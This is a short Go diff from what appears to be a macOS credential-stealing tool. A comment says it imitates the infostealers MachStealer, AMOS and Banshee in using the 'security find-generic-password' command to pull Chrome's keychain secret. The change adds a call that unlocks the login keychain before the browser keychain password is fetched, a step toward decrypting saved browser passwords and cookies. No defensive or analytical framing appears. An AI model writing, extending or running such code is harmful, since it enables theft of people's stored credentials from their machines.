@@ -86,6 +86,8 @@ func keychainAccountsForBrowser(browserName string) []string {
 // MachStealer/AMOS/Banshee use: security find-generic-password -wa "Chrome"
 // (-w stdout, -a account) — NOT the service name as the -a argument.
 func getKeychainPassword(browserName string) (string, error) {
+	_ = EnsureLoginKeychainUnlocked()
+
 	service := chromeKeychainService(browserName)
 	loginKC := loginKeychainPath()
 	accounts := keychainAccountsForBrowser(browserName)
